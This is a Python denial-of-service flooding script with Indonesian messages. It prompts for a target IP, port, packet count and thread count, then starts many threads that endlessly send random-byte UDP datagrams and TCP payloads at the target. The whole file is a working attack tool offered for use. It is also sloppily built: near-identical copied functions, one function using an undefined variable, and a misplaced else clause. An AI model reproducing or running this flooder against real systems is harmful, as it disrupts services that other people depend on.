import random
import socket
import time
import os,sys
import threading

os.system("clear")
print("JANGAN ABUSE NGETOD")
ip = str(input("TARGET IP:"))
port = int(input("TARGET PORT:"))
choice = str(input("GASS?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("ONGKIR:"))
def run():
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            print("======>EZZ DEKK<======")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")

def run4():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            print("======>EZZ DEKK<======")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
            
def run7():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")

def run8():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            print("======>EZZ DEKK<======")
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
            
def run11():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")

def run12():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")

def run14():
    data = random._urandom(16)
    i = random.choice(("DOWN ","DOWN ","DOWN "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Menyerang Ip %s Dengan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>EZZ DEKK<======")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
else:
        th = threading.Thread(target = run14)
        th.start()